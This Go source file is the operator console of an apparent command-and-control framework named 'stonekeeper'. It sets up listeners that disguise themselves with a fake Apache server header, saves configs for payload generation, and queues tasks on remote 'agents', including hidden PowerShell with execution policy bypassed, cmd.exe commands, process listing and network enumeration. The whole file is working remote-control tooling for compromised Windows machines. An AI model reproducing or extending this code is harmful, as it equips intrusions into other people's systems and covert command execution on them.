package terminal

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"stonekeeper/aesgen"
	"stonekeeper/database"
	"stonekeeper/routes"
	"stonekeeper/signals"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
)

type Command interface {
	Execute(args []string)
	Description() string
	Usage() string
}

type CommandGroup struct {
	Name     string
	Commands []Command
}

type CommandRegistryType map[string]Command

var (
	CommandRegistry = CommandRegistryType{}
	CommandGroups   = []CommandGroup{}

	commandColor = color.New(color.FgCyan).SprintFunc()
	usageColor   = color.New(color.FgYellow).SprintFunc()
)

func RegisterCommandToGroup(commandNames []string, command Command, groupName string) {
	// Add all aliases to the CommandRegistry for quick access
	for _, cmdName := range commandNames {
		CommandRegistry[cmdName] = command
	}

	// Find the group in CommandGroups; if not found, create a new group
	found := false
	for i := range CommandGroups {
		if CommandGroups[i].Name == groupName {
			CommandGroups[i].Commands = append(CommandGroups[i].Commands, command)
			found = true
			break
		}
	}

	// If the group wasn't found, create a new one and append to CommandGroups
	if !found {
		newGroup := CommandGroup{
			Name:     groupName,
			Commands: []Command{command},
		}
		CommandGroups = append(CommandGroups, newGroup)
	}
}

func (cr CommandRegistryType) DescribeAllCommands() {
	described := make(map[Command]bool)
	maxLength := 0

	// Calculate the max length
	for _, group := range CommandGroups {
		for _, cmd := range group.Commands {
			if len(cmd.Description()) > maxLength {
				maxLength = len(cmd.Description())
			}
			if len(cmd.Usage()) > maxLength {
				maxLength = len(cmd.Usage())
			}
		}
	}

	divider := strings.Repeat("─", maxLength+4) // +4 to account for some margin

	titleColor := color.New(color.FgBlue, color.Bold, color.Underline).SprintFunc()

	// Print header
	fmt.Println(commandColor(divider))
	fmt.Println(commandColor(" " + strings.Repeat(" ", (maxLength-8)/2) + "COMMANDS" + strings.Repeat(" ", (maxLength-8)/2) + " "))
	fmt.Println(commandColor(divider))

	// Now, go through each group, display its title and then its commands
	for _, group := range CommandGroups {
		fmt.Println(titleColor(strings.Repeat("=", maxLength)))
		fmt.Println(titleColor(group.Name))
		fmt.Println(titleColor(strings.Repeat("=", maxLength)))

		for _, cmd := range group.Commands {
			if !described[cmd] {
				fmt.Println(commandColor(">"), commandColor(cmd.Usage()))
				fmt.Println("   ", cmd.Description())
				described[cmd] = true
			}
		}
	}

	// Print footer
	fmt.Println(commandColor(divider))
}

func insertAtBeginning(slice []string, value string) []string {
	// Make a new slice with one extra space
	result := make([]string, 1, len(slice)+1)

	// Set the first element to the new value
	result[0] = value

	// Append the rest of the slice
	result = append(result, slice...)

	return result
}

type CreateListenerCommand struct{}
type ListListenersCommand struct{}
type DeleteListenerByIDCommand struct{}
type DeleteAllListenersCommand struct{}
type KillListenerByIDCommand struct{}
type ListAgentsCommand struct{}
type DeleteAgentByIDCommand struct{}
type DeleteAllAgentsCommand struct{}
type ListTasksByAgentIDCommand struct{}
type ListProcessesCommand struct{}
type ShellCommand struct{}
type PowerCommand struct{}
type AdaptersCommand struct{}
type DescribeAllCommandsCommand struct{}
type ExitCommand struct{}
type ClearCommand struct{}

func (c *CreateListenerCommand) Execute(args []string) {
	// Default values
	name := "evil"
	port := "6969"
	ip := "0.0.0.0"
	protocol := "http"
	userAgent := "StoneKeeper Agent/1.0"
	serverHeader := "Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.1"
	html404Path := "templates/404.html"
	sslCertPath := ""
	sslKeyPath := ""

	// Override with provided arguments, if any
	switch len(args) {
	case 9:
		sslKeyPath = args[8]
		fallthrough
	case 8:
		sslCertPath = args[7]
		fallthrough
	case 7:
		html404Path = args[6]
		fallthrough
	case 6:
		serverHeader = args[5]
		fallthrough
	case 5:
		userAgent = args[4]
		fallthrough
	case 4:
		protocol = args[3]
		fallthrough
	case 3:
		ip = args[2]
		fallthrough
	case 2:
		port = args[1]
		fallthrough
	case 1:
		name = args[0]
	case 0:
		// No arguments, use all default values
	default:
		fmt.Println("Invalid number of arguments. Expected up to 9: name, port, ip, protocol, user_agent, server_header, html_404_path, ssl_cert_path (optional) ssl_key_path (optional).")
		return
	}

	// Assuming Listener is a struct defined in your code.
	listener := database.Listener{
		Name:         name,
		Port:         port,
		IP:           ip,
		Running:      false,                                    // Set Running to false
		Time:         time.Now().Format("2006-01-02 15:04:05"), // Set Time to current time
		Protocol:     protocol,
		UserAgent:    userAgent,
		ServerHeader: serverHeader,
		HTML404Path:  html404Path,
		SSLCertPath:  sslCertPath,
		SSLKeyPath:   sslKeyPath,
	}

	listener.AesKey, listener.XorKey, listener.IV = aesgen.GenerateKeysAndIV()

	// Insert listener into database
	err := database.InsertListener(&listener)
	if err != nil {
		fmt.Println("Error inserting listener:", err)
		return
	} else {
		// Start the server
		routes.StartServer(&listener)
		CommandRegistry["list_listeners"].Execute([]string{})

		// Write the details of the listener to a JSON file for automated payload generation, specify the file path
		filePath := "payload-generator/payload-configs/" + strconv.Itoa(listener.ID) + ".json"

		// Open the file with os.Create to create the file if it does not exist or truncate it if it exists
		file, err := os.Create(filePath)
		if err != nil {
			fmt.Println("Error creating/opening the file:", err)
			return
		}
		defer file.Close()

		// Encode the Person struct to JSON and write it to the file
		encoder := json.NewEncoder(file)
		if err := encoder.Encode(listener); err != nil {
			fmt.Println("Error encoding the JSON data:", err)
			return
		}
	}
}

func (c *CreateListenerCommand) Description() string {
	return "Create a new listener with given parameters."
}

func (c *CreateListenerCommand) Usage() string {
	return "create_listener <name> <port> <ip> <protocol> (http/https) <user_agent> <server_header> <html_404_path> <ssl_cert_path> (optional) <ssl_key_path> (optional)"
}

func (l *ListListenersCommand) Execute(args []string) {
	_, err := database.ListListeners()
	if err != nil {
		fmt.Println("Error listing listeners:", err)
		return
	}
}

func (l *ListListenersCommand) Description() string {
	return "List all listeners."
}

func (l *ListListenersCommand) Usage() string {
	return "list_listeners"
}

func (d *DeleteListenerByIDCommand) Execute(args []string) {
	// Check if an argument is provided
	if len(args) == 0 {
		fmt.Println("Missing argument: ID of the listener to delete")
		return
	}

	// Convert the argument (string) to an integer
	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("Invalid ID provided: %s. It should be a number.\n", args[0])
		return
	}

	// Call the database function to delete the listener by ID
	err = database.DeleteListenerByID(id)
	if err != nil {
		fmt.Printf("Error executing DeleteListenerByID: %v\n", err)
		return
	}

	// If everything went well
	fmt.Printf("Successfully deleted listener with ID: %d\n", id)
}

func (d *DeleteListenerByIDCommand) Description() string {
	return "Delete the listener with the given ID."
}

func (d *DeleteListenerByIDCommand) Usage() string {
	return "delete_listener <listener_id>"
}

func (d *DeleteAllListenersCommand) Execute(args []string) {
	err := database.DeleteAllListeners()
	if err != nil {
		fmt.Printf("Error executing DeleteAllListeners: %v\n", err)
		return
	}

	fmt.Println("Successfully deleted all listeners")
}

func (d *DeleteAllListenersCommand) Description() string {
	return "Delete all listeners."
}

func (d *DeleteAllListenersCommand) Usage() string {
	return "delete_all_listeners"
}

func (k *KillListenerByIDCommand) Execute(args []string) {
	// Check if an argument is provided
	if len(args) == 0 {
		fmt.Println("Missing argument: ID of the listener to kill")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("Invalid ID provided: %s. It should be a number.\n", args[0])
		return
	}
	listener, err := database.GetListenerByID(id)
	if err != nil {
		fmt.Printf("Error executing GetListenerByID: %v\n", err)
		return
	}
	err = routes.ShutdownServer(&listener)
	if err != nil {
		fmt.Printf("Error executing ShutdownServer: %v\n", err)
		return
	}
	CommandRegistry["list_listeners"].Execute([]string{})
}

func (k *KillListenerByIDCommand) Description() string {
	return "Kill the listener with the given ID."
}

func (k *KillListenerByIDCommand) Usage() string {
	return "kill_listener <listener_id>"
}

func (l *ListAgentsCommand) Execute(args []string) {
	_, err := database.ListAgents()
	if err != nil {
		fmt.Println("Error listing agents:", err)
		return
	}
}

func (l *ListAgentsCommand) Description() string {
	return "List all agents."
}

func (l *ListAgentsCommand) Usage() string {
	return "list_agents"
}

func (d *DeleteAgentByIDCommand) Execute(args []string) {
	// Check if an argument is provided
	if len(args) == 0 {
		fmt.Println("Missing argument: ID of the agent to delete")
		return
	}

	// Convert the argument (string) to an integer
	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("Invalid ID provided: %s. It should be a number.\n", args[0])
		return
	}

	// Call the database function to delete the agent by ID
	err = database.DeleteAgentByID(id)
	if err != nil {
		fmt.Printf("Error executing DeleteAgentByID: %v\n", err)
		return
	}

	// If everything went well
	fmt.Printf("Successfully deleted agent with ID: %d\n", id)
}

func (d *DeleteAgentByIDCommand) Description() string {
	return "Delete the agent with the given ID."
}

func (d *DeleteAgentByIDCommand) Usage() string {
	return "delete_agent <agent_id>"
}

func (d *DeleteAllAgentsCommand) Execute(args []string) {
	err := database.DeleteAllAgents()
	if err != nil {
		fmt.Printf("Error executing DeleteAllAgents: %v\n", err)
		return
	}

	fmt.Println("Successfully deleted all agents")
}

func (d *DeleteAllAgentsCommand) Description() string {
	return "Delete all agents."
}

func (d *DeleteAllAgentsCommand) Usage() string {
	return "delete_all_agents"
}

func (l *ListTasksByAgentIDCommand) Execute(args []string) {
	// Check if an argument is provided
	switch len(args) {
	case 0:
		fmt.Println("Missing argument: ID of the agent to list tasks for")
		return
	case 1:
		fmt.Println("Missing argument: active_only")
		return
	}

	// Convert the argument (string) to an integer
	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("Invalid ID provided: %s. It should be a number.\n", args[0])
		return
	}

	// Check the value of active_only
	activeOnly := false
	if strings.EqualFold(args[1], "true") {
		activeOnly = true
	}

	_, err = database.GetTasksForAgent(id, true, activeOnly)
	if err != nil {
		fmt.Println("Error getting tasks:", err)
		return
	}
}

func (l *ListTasksByAgentIDCommand) Description() string {
	return "List all tasks for a given agent by its ID. Specify 'true' for active_only to list only active tasks. Specify 'false' to list all tasks."
}

func (l *ListTasksByAgentIDCommand) Usage() string {
	return "list_tasks <agent_id> <active_only>"
}

func (l *ListProcessesCommand) Execute(args []string) {
	switch len(args) {
	case 0:
		fmt.Println("Missing argument: ID of the agent to list processes for")
		return
	case 1:
		fmt.Println("Missing argument: timeout in seconds")
		return
	}

	timeout, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Printf("Invalid timeout provided: %s. It should be a number.\n", args[1])
		return
	}

	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("Invalid ID provided: %s. It should be a number.\n", args[0])
		return
	}

	task := database.Task{
		AgentID:    id,
		Command:    "ps",
		Arguments:  make([]string, 0),
		Timeout:    timeout,
		Active:     true,
		Success:    false,
		InQueue:    true,
		TimedOut:   false,
		CreateTime: time.Now().Format("2006-01-02 15:04:05"),
		EndTime:    time.Now().Format("2006-01-02 15:04:05"),
		Result:     "",
	}

	// Insert task into database
	err = database.InsertTask(&task)
	if err != nil {
		fmt.Println("Error inserting task:", err)
		return
	} else {
		CommandRegistry["list_tasks"].Execute([]string{args[0], "true"})
	}
}

func (l *ListProcessesCommand) Description() string {
	return "List all running processes for a given agent by its ID."
}

func (l *ListProcessesCommand) Usage() string {
	return "ps <agent_id> <timeout_in_secs>"
}

func (s *ShellCommand) Execute(args []string) {
	if len(args) == 0 {
		fmt.Println("Missing argument: ID of the agent to execute the command on")
		return
	} else if len(args) < 3 {
		fmt.Printf("Missing arguments! Usage: %s\n", s.Usage())
		return
	}

	// Parse the first argument (agent_id)
	agentID, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Println("Error parsing agent ID:", err)
		return
	}

	// Parse the last argument (timeout)
	timeout, err := strconv.Atoi(args[len(args)-1])
	if err != nil {
		fmt.Println("Error parsing timeout:", err)
		return
	}

	// The middle arguments
	middleArgs := args[1 : len(args)-1]
	updatedSlice := insertAtBeginning(middleArgs, "cmd.exe /c")

	task := database.Task{
		AgentID:    agentID,
		Command:    "shell",
		Arguments:  updatedSlice,
		Timeout:    timeout,
		Active:     true,
		Success:    false,
		InQueue:    true,
		TimedOut:   false,
		CreateTime: time.Now().Format("2006-01-02 15:04:05"),
		EndTime:    time.Now().Format("2006-01-02 15:04:05"),
		Result:     "",
	}

	// Insert task into database
	err = database.InsertTask(&task)
	if err != nil {
		fmt.Println("Error inserting task:", err)
		return
	} else {
		CommandRegistry["list_tasks"].Execute([]string{args[0], "true"})
	}
}

func (s *ShellCommand) Description() string {
	return "Execute a cmd.exe command for a given agent by its ID."
}

func (s *ShellCommand) Usage() string {
	return "shell <agent_id> <args> <timeout_in_secs>"
}

func (p *PowerCommand) Execute(args []string) {
	if len(args) == 0 {
		fmt.Println("Missing argument: ID of the agent to execute the command on")
		return
	} else if len(args) < 3 {
		fmt.Printf("Missing arguments! Usage: %s\n", p.Usage())
		return
	}

	// Parse the first argument (agent_id)
	agentID, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Println("Error parsing agent ID:", err)
		return
	}

	// Parse the last argument (timeout)
	timeout, err := strconv.Atoi(args[len(args)-1])
	if err != nil {
		fmt.Println("Error parsing timeout:", err)
		return
	}

	// The middle arguments
	middleArgs := args[1 : len(args)-1]
	updatedSlice := insertAtBeginning(middleArgs, "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -c")

	task := database.Task{
		AgentID:    agentID,
		Command:    "power",
		Arguments:  updatedSlice,
		Timeout:    timeout,
		Active:     true,
		Success:    false,
		InQueue:    true,
		TimedOut:   false,
		CreateTime: time.Now().Format("2006-01-02 15:04:05"),
		EndTime:    time.Now().Format("2006-01-02 15:04:05"),
		Result:     "",
	}

	// Insert task into database
	err = database.InsertTask(&task)
	if err != nil {
		fmt.Println("Error inserting task:", err)
		return
	} else {
		CommandRegistry["list_tasks"].Execute([]string{args[0], "true"})
	}
}

func (p *PowerCommand) Description() string {
	return "Execute a cmd.exe command for a given agent by its ID."
}

func (p *PowerCommand) Usage() string {
	return "power <agent_id> <args> <timeout_in_secs>"
}

func (a *AdaptersCommand) Execute(args []string) {
	switch len(args) {
	case 0:
		fmt.Println("Missing argument: ID of the agent to enumerate network adapters for")
		return
	case 1:
		fmt.Println("Missing argument: timeout in seconds")
		return
	}

	timeout, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Printf("Invalid timeout provided: %s. It should be a number.\n", args[1])
		return
	}

	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("Invalid ID provided: %s. It should be a number.\n", args[0])
		return
	}

	task := database.Task{
		AgentID:    id,
		Command:    "adapters",
		Arguments:  make([]string, 0),
		Timeout:    timeout,
		Active:     true,
		Success:    false,
		InQueue:    true,
		TimedOut:   false,
		CreateTime: time.Now().Format("2006-01-02 15:04:05"),
		EndTime:    time.Now().Format("2006-01-02 15:04:05"),
		Result:     "",
	}

	// Insert task into database
	err = database.InsertTask(&task)
	if err != nil {
		fmt.Println("Error inserting task:", err)
		return
	} else {
		CommandRegistry["list_tasks"].Execute([]string{args[0], "true"})
	}
}

func (a *AdaptersCommand) Description() string {
	return "Perform a network adapter enumeration for a given agent by its ID."
}

func (a *AdaptersCommand) Usage() string {
	return "adapters <agent_id> <timeout_in_secs>"
}

func (d *DescribeAllCommandsCommand) Execute(args []string) {
	CommandRegistry.DescribeAllCommands()
}

func (d *DescribeAllCommandsCommand) Description() string {
	return "Describe all available commands."
}

func (d *DescribeAllCommandsCommand) Usage() string {
	return "describe, help, ?"
}

func (e *ExitCommand) Execute(args []string) {
	err := database.ShutdownListeners()
	if err != nil {
		fmt.Println("Error shutting down listeners:", err)
	}
	os.Exit(0)
}

func (e *ExitCommand) Description() string {
	return "Exit the program."
}

func (e *ExitCommand) Usage() string {
	return "exit, quit, q"
}

func (c *ClearCommand) Execute(args []string) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", "cls")
	default:
		cmd = exec.Command("clear")
	}

	cmd.Stdout = os.Stdout
	cmd.Run()
}

func (c *ClearCommand) Description() string {
	return "Clear the terminal screen."
}

func (c *ClearCommand) Usage() string {
	return "clear, cls"
}

func parseCommandLine(input string) ([]string, error) {
	var args []string
	var sb strings.Builder
	var quoteChar rune // Track the type of quote encountered

	for _, r := range input {
		switch {
		case r == '"' || r == '\'':
			if quoteChar == 0 { // Starting a quoted segment
				quoteChar = r
			} else if quoteChar == r { // Ending a quoted segment
				args = append(args, sb.String())
				sb.Reset()
				quoteChar = 0
			} else {
				sb.WriteRune(r)
			}
		case r == ' ' && quoteChar == 0:
			if sb.Len() > 0 {
				args = append(args, sb.String())
				sb.Reset()
			}
		default:
			sb.WriteRune(r)
		}
	}

	if sb.Len() > 0 {
		args = append(args, sb.String())
	}

	if quoteChar != 0 {
		return nil, fmt.Errorf("mismatched quotes in command line")
	}

	return args, nil
}

// Start function to initiate the terminal. This will be non-blocking.
func Start() {
	// Intercept SIGINT (Ctrl+C) and print a message
	signals.SetupSignalInterception()
	// Register commands
	RegisterCommandToGroup([]string{"create_listener"}, &CreateListenerCommand{}, "Listeners")
	RegisterCommandToGroup([]string{"list_listeners"}, &ListListenersCommand{}, "Listeners")
	RegisterCommandToGroup([]string{"delete_listener"}, &DeleteListenerByIDCommand{}, "Listeners")
	RegisterCommandToGroup([]string{"delete_all_listeners"}, &DeleteAllListenersCommand{}, "Listeners")
	RegisterCommandToGroup([]string{"kill_listener"}, &KillListenerByIDCommand{}, "Listeners")
	RegisterCommandToGroup([]string{"list_agents"}, &ListAgentsCommand{}, "Agents")
	RegisterCommandToGroup([]string{"delete_agent"}, &DeleteAgentByIDCommand{}, "Agents")
	RegisterCommandToGroup([]string{"delete_all_agents"}, &DeleteAllAgentsCommand{}, "Agents")
	RegisterCommandToGroup([]string{"list_tasks"}, &ListTasksByAgentIDCommand{}, "Agents")
	RegisterCommandToGroup([]string{"ps"}, &ListProcessesCommand{}, "Agents")
	RegisterCommandToGroup([]string{"shell"}, &ShellCommand{}, "Agents")
	RegisterCommandToGroup([]string{"power"}, &PowerCommand{}, "Agents")
	RegisterCommandToGroup([]string{"adapters"}, &AdaptersCommand{}, "Agents")
	RegisterCommandToGroup([]string{"describe", "help", "?"}, &DescribeAllCommandsCommand{}, "General")
	RegisterCommandToGroup([]string{"exit", "quit", "q"}, &ExitCommand{}, "General")
	RegisterCommandToGroup([]string{"clear", "cls"}, &ClearCommand{}, "General")
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		args, err := parseCommandLine(input)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}

		if len(args) == 0 { // Check if args is empty
			continue // If it's empty, continue to the next iteration of the loop
		}

		cmdName := args[0]
		args = args[1:]

		if cmd, exists := CommandRegistry[cmdName]; exists {
			cmd.Execute(args)
		} else {
			fmt.Println("Unknown command:", cmdName)
		}
	}
}
